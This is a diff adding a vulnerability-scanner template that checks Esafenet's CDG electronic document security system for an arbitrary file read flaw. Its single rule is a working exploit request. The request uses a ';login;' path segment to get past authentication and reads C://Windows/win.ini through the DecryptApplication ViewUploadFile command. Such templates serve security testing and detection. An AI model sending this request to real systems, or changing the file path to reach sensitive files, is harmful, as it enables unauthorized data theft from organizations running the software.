@@ -1,0 +1,11 @@
+name: 亿赛通-电子文档安全管理系统-ViewUploadFile-文件读取
+description: >-
+  任意文件读取
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /CDGServer3/client/;login;/DecryptApplication?command=ViewUploadFile&filePath=C://Windows/win.ini&uploadFileId=1&fileName1=2
+    expression:
+      status: 200
+      body_all: ["fonts"]
